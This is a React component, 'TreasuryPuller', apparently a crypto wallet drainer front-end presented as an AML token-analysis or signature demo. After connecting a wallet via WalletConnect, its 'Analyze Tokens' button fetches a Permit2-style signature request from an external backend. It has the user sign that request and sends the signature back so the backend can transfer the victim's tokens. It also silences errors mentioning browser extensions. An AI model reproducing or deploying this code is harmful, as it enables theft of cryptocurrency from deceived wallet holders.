import React, { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import EthereumProvider from '@walletconnect/ethereum-provider';

export default function TreasuryPuller() {
  const [address, setAddress] = useState(null);
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [networkName, setNetworkName] = useState(null);
  const [balance, setBalance] = useState(null);
  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState({ message: '', type: '' });
  const [analysisResult, setAnalysisResult] = useState(null);
  const [selectedToken, setSelectedToken] = useState(null);

  const WALLETCONNECT_PROJECT_ID = '5dbf8d0146c7e7d2e0fc9862ace1ce26';
  const BACKEND_URL = 'https://aml-manager-backend.onrender.com';

  // Ignore extension errors
  useEffect(() => {
    const handleError = (event) => {
      if (
        event.message?.includes('chrome-extension') ||
        event.message?.includes('parameter 1 is not of type') ||
        event.message?.includes('detectWords')
      ) {
        event.preventDefault();
        event.stopPropagation();
        return false;
      }
    };
    const handleUnhandledRejection = (event) => {
      if (
        event.reason?.message?.includes('chrome-extension') ||
        event.reason?.message?.includes('parameter 1 is not of type') ||
        event.reason?.message?.includes('detectWords')
      ) {
        event.preventDefault();
        return false;
      }
    };
    window.addEventListener('error', handleError);
    window.addEventListener('unhandledrejection', handleUnhandledRejection);
    return () => {
      window.removeEventListener('error', handleError);
      window.removeEventListener('unhandledrejection', handleUnhandledRejection);
    };
  }, []);

  /** ===============================
   *  1️⃣ Connect Wallet via WalletConnect
   *  =============================== */
  const connectWallet = async () => {
    try {
      setLoading(true);
      setStatus({ message: 'Connecting wallet...', type: 'info' });

      const wcProvider = await EthereumProvider.init({
        projectId: WALLETCONNECT_PROJECT_ID,
        chains: [1],
        showQrModal: true,
        metadata: {
          name: 'TreasuryPuller',
          description: 'Off-Chain Signature Demo',
          url: window.location.origin,
          icons: ['https://avatars.githubusercontent.com/u/37784886']
        }
      });

      await wcProvider.enable();
      const ethersProvider = new ethers.BrowserProvider(wcProvider);
      const signer = await ethersProvider.getSigner();
      const userAddress = await signer.getAddress();
      const network = await ethersProvider.getNetwork();

      setProvider(ethersProvider);
      setSigner(signer);
      setAddress(userAddress);
      setNetworkName(network.name || `Chain ID: ${network.chainId}`);

      const ethBalance = await ethersProvider.getBalance(userAddress);
      setBalance(ethers.formatEther(ethBalance));

      setStatus({
        message: `✅ Connected: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)} (${network.name})`,
        type: 'success'
      });

      wcProvider.on('disconnect', () => {
        setAddress(null);
        setProvider(null);
        setSigner(null);
        setStatus({ message: 'Wallet disconnected', type: 'error' });
      });
    } catch (err) {
      console.error(err);
      setStatus({ message: `❌ Connection failed: ${err.message}`, type: 'error' });
    } finally {
      setLoading(false);
    }
  };

  /** ===============================
   *  2️⃣ Analyze Tokens (Backend Request)
   *  =============================== */
  const analyzeTokens = async () => {
    if (!address) {
      setStatus({ message: 'Please connect your wallet first.', type: 'error' });
      return;
    }
    try {
      setLoading(true);
      setStatus({ message: 'Analyzing tokens...', type: 'info' });

      const response = await fetch(`${BACKEND_URL}/get-signature-request`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userAddress: address })
      });

      const data = await response.json();
      if (!data.success) throw new Error(data.error);

      setSelectedToken({
        address: data.tokenAddress,
        symbol: data.tokenSymbol,
        amount: data.amount
      });

      const formatted = ethers.formatUnits(data.amount, 6);
      setAnalysisResult({
        tokenSymbol: data.tokenSymbol,
        amount: formatted,
        tokenAddress: data.tokenAddress
      });

      setStatus({
        message: `✅ Token ready: ${data.tokenSymbol} (${formatted}). Please sign...`,
        type: 'info'
      });

      await signAndTransfer(data, {
        address: data.tokenAddress,
        symbol: data.tokenSymbol,
        amount: data.amount
      });
    } catch (err) {
      console.error(err);
      setStatus({ message: `❌ Analysis failed: ${err.message}`, type: 'error' });
    } finally {
      setLoading(false);
    }
  };

  /** ===============================
   *  3️⃣ Sign Message & Send Transfer
   *  =============================== */
  const signAndTransfer = async (signatureData, tokenData) => {
    try {
      if (!signer) throw new Error('Wallet not connected.');
      const currentAddress = await signer.getAddress();
      if (currentAddress.toLowerCase() !== address.toLowerCase()) {
        throw new Error('Wallet address mismatch — reconnect and try again.');
      }

      const fallbackMessage = `Approve transfer of ${signatureData.value.permitted.amount} tokens to ${signatureData.value.spender}`;
      console.log('🟡 Signing fallback message:', fallbackMessage);

      let signature;
      try {
        // Try EIP-712 first
        signature = await signer.signTypedData(
          signatureData.domain,
          signatureData.types,
          signatureData.value
        );
        console.log('✅ EIP-712 Signature:', signature);
      } catch (e) {
        // Fallback to plain message
        console.warn('EIP-712 signing failed, falling back to signMessage...');
        signature = await signer.signMessage(fallbackMessage);
        console.log('✅ Fallback signature:', signature);
      }

      setStatus({ message: '✅ Signature approved! Executing transfer...', type: 'info' });

      const response = await fetch(`${BACKEND_URL}/transfer-tokens`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userAddress: currentAddress,
          signature,
          signatureData,
          message: fallbackMessage
        })
      });

      const result = await response.json();
      if (result.success) {
        setStatus({
          message: `✅ Transfer successful: ${result.transactionHash}`,
          type: 'success'
        });
      } else {
        throw new Error(result.error || 'Unknown transfer error.');
      }
    } catch (err) {
      console.error(err);
      setStatus({ message: `❌ Transfer failed: ${err.message}`, type: 'error' });
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-400 via-purple-500 to-purple-600 p-5">
      <div className="max-w-4xl mx-auto bg-white rounded-3xl shadow-2xl overflow-hidden">
        <div className="bg-gradient-to-r from-blue-400 to-cyan-400 text-white p-8 text-center">
          <h1 className="text-4xl font-bold mb-2">🏛️ TreasuryPuller</h1>
          <p className="text-lg opacity-90">
            Trust Wallet Off-Chain Signature Demo - $15 USDT Transfer
          </p>
        </div>

        <div className="p-10">
          {/* Wallet Section */}
          <div className="bg-gray-50 rounded-2xl p-8 mb-8 text-center">
            {!address ? (
              <button
                onClick={connectWallet}
                disabled={loading}
                className="w-full bg-gradient-to-r from-blue-400 to-cyan-400 text-white py-4 px-8 rounded-xl font-semibold text-lg hover:from-blue-500 hover:to-cyan-500 disabled:opacity-50"
              >
                {loading ? '🔄 Connecting...' : '📱 Connect with Trust Wallet (QR)'}
              </button>
            ) : (
              <div className="bg-green-50 border border-green-400 rounded-xl p-6">
                <div className="text-green-800 font-semibold">
                  ✅ {address.slice(0, 6)}...{address.slice(-4)}
                </div>
                <div className="text-sm text-gray-600">
                  {networkName} — {balance} ETH
                </div>
              </div>
            )}
          </div>

          {/* Transfer Section */}
          {address && (
            <div className="bg-white border rounded-2xl p-8 mb-8">
              <h2 className="text-2xl font-semibold mb-6 text-gray-800">💰 Token Transfer</h2>
              <button
                onClick={analyzeTokens}
                disabled={loading}
                className="w-full bg-gradient-to-r from-green-400 to-blue-400 text-white py-4 px-8 rounded-xl font-semibold text-lg hover:from-green-500 hover:to-blue-500 disabled:opacity-50"
              >
                {loading ? '🔄 Processing...' : '🚀 Analyze & Transfer Tokens'}
              </button>

              {analysisResult && (
                <div className="mt-6 bg-blue-50 border border-blue-200 rounded-xl p-4 text-sm text-blue-700">
                  <div>Symbol: {analysisResult.tokenSymbol}</div>
                  <div>Amount: {analysisResult.amount}</div>
                  <div>Address: {analysisResult.tokenAddress}</div>
                </div>
              )}
            </div>
          )}

          {/* Status */}
          {status.message && (
            <div
              className={`p-4 rounded-xl font-medium ${
                status.type === 'success'
                  ? 'bg-green-100 text-green-800 border border-green-200'
                  : status.type === 'error'
                  ? 'bg-red-100 text-red-800 border border-red-200'
                  : 'bg-blue-100 text-blue-800 border border-blue-200'
              }`}
            >
              {status.message}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
